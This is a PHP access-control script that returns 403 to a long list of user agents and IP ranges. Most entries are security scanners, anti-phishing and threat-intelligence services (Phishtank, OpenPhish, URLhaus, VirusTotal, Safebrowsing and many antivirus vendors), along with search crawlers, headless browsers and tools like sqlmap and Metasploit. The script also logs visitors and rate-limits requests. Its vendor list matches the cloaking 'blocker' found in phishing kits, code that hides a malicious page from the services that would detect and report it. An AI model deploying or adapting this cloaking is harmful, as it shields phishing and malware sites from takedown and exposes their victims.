<?php
$blockedUserAgents = [
    'curl',
    'wget',
    'python-urllib',
    'python-requests',
    'libwww-perl',
    'scrapy',
    'PostmanRuntime',
    'Go-http-client',
    'Java/',
    'sqlmap',
    'nikto',
    'nmap',
    'Metasploit',
    'AhrefsBot',
    'MJ12bot',
    'SemrushBot',
    'YandexBot',
    'Baiduspider',
    'DotBot',
    'spbot',
    'LinkpadBot',
    'MegaIndex',
    'PhantomJS',
    'HeadlessChrome',
    'Googlebot', 
    'bingbot',   
    'Twitterbot',
    'FacebookExternalHit',
    'Facebot',
    'Abusix',
    'Acronis',
    'ADMINUSLabs',
    'AILabs',
    'AlienVault',
    'alphaMountain.ai',
    'Antiy-AVL',
    'benkow.cc',
    'BitDefender',
    'Blueliv',
    'Certego',
    'Chong Lua Dao',
    'CINS Army',
    'CMC Threat Intelligence',
    'CRDF',
    'Criminal IP',
    'Cyble',
    'CyRadar',
    'desenmascara.me',
    'DNS8',
    'Dr.Web',
    'EmergingThreats',
    'Emsisoft',
    'ESET',
    'ESTsecurity',
    'Forcepoint ThreatSeeker',
    'Fortinet',
    'G-Data',
    'Google Safebrowsing',
    'GreenSnow',
    'Heimdal Security',
    'IPsum',
    'Juniper Networks',
    'Lionic',
    'Malwared',
    'MalwarePatrol',
    'malwares.com URL checker',
    'OpenPhish',
    'Phishing Database',
    'Phishtank',
    'PREBYTES',
    'Quick Heal',
    'Quttera',
    'Scantitan',
    'SCUMWARE.org',
    'Seclookup',
    'securolytics',
    'Snort IP sample list',
    'Sophos',
    'Spam404',
    'StopForumSpam',
    'Sucuri SiteCheck',
    'ThreatHive',
    'Threatsourcing',
    'Trustwave',
    'URLhaus',
    'Viettel Threat Intelligence',
    'ViriBack',
    'VX Vault',
    'Webroot',
    'Yandex Safebrowsing',
    'ZeroCERT',
    '0xSI_f33d',
    'AlphaSOC',
    'ArcSight Threat Intelligence',
    'AutoShun',
    'Axur',
    'Bfore.Ai PreCrime',
    'Bkav',
    'Cluster25',
    'CSIS Security Group',
    'Cyan',
    'Ermes',
    'GCP Abuse Intelligence',
    'Gridinsoft',
    'Hunt.io Intelligence',
    'Kaspersky',
    'Lumu',
    'MalwareURL',
    'Netcraft',
    'PhishFort',
    'PhishLabs',
    'PrecisionSec',
    'SafeToOpen',
    'Sansec eComscan',
    'SecureBrain',
    'Segasec',
    'SOCRadar',
	'Spamrl',
    'Underworld',
    'URLQuery',
    'VIPRE',
    'VirusTotal',
    'Xcitium Verdict Cloud',
    'ZeroFox',
    'zvelo',
	'Mozilla/4.0',
    'Mozilla/5.0 (compatible;',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0)',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/',
    'Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/',
];

$blockedIPPrefixes = [
    '192.168.',  
    '203.0.',    
    '34.64.',   
    '34.72.',    
    '34.98.',    
    '193.105.',  
    '54.36.',   
    '89.248.',  
    '185.191.',  
    '5.188.',    
    '45.133.',   
    '91.200.',   
	'172.0.',
	'172.60.',
	'172.64.',
	'172.66.',
	'172.71.',
	'172.255.',
	'74.0.',
	'74.125.',
	'74.255.',
	'172.0.',
	'172.253.',
	'172.255.',
    '77.88.',    
    '78.46.',    
    '85.214.',   
    '91.107.',   
    '93.180.',   
    '94.130.',   
    '95.216.',   
    '109.201.',  
    '144.76.',   
    '176.9.',    
    '178.63.',   
    '185.153.',  
    '195.201.',  
    '213.239.',  
];

$accessesFolder = 'accesses';
if (!is_dir($accessesFolder)) {
    mkdir($accessesFolder, 0777, true);
}

$authorizedLogFile = "$accessesFolder/authorized.txt";
$unauthorizedLogFile = "$accessesFolder/unauthorized.txt";

function logAttempt($message, $file) {
    $entry = date('Y-m-d H:i:s') . " - $message\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

foreach ($blockedUserAgents as $botAgent) {
    if (stripos($userAgent, $botAgent) !== false) {
        logAttempt("Blocked User-Agent: $userAgent from IP: $clientIP", $unauthorizedLogFile);
        header('HTTP/1.1 403 Forbidden');
        exit('Access Denied');
    }
}

foreach ($blockedIPPrefixes as $prefix) {
    if (strpos($clientIP, $prefix) === 0) {
        logAttempt("Blocked IP: $clientIP (Range: $prefix*)", $unauthorizedLogFile);
        header('HTTP/1.1 403 Forbidden');
        exit('Access Denied');
    }
}

if (isset($_GET['honeypot'])) {
    logAttempt("Honeypot triggered by IP: $clientIP with User-Agent: $userAgent", $unauthorizedLogFile);
    header('HTTP/1.1 403 Forbidden');
    exit('Access Denied');
}

$rateLimitFile = 'rate_limit.txt';
$rateLimitTime = 60; 
$rateLimitCount = 10; 

if (file_exists($rateLimitFile)) {
    $rateData = json_decode(file_get_contents($rateLimitFile), true);
    if (time() - $rateData['timestamp'] < $rateLimitTime) {
        if ($rateData['count'] >= $rateLimitCount) {
            logAttempt("Rate limit exceeded by IP: $clientIP with User-Agent: $userAgent", $unauthorizedLogFile);
            header('HTTP/1.1 429 Too Many Requests');
            exit('Rate limit exceeded. Please try again later.');
        } else {
            $rateData['count']++;
        }
    } else {
        $rateData = ['timestamp' => time(), 'count' => 1];
    }
} else {
    $rateData = ['timestamp' => time(), 'count' => 1];
}

file_put_contents($rateLimitFile, json_encode($rateData));

logAttempt("Authorized access from IP: $clientIP with User-Agent: $userAgent", $authorizedLogFile);

?>
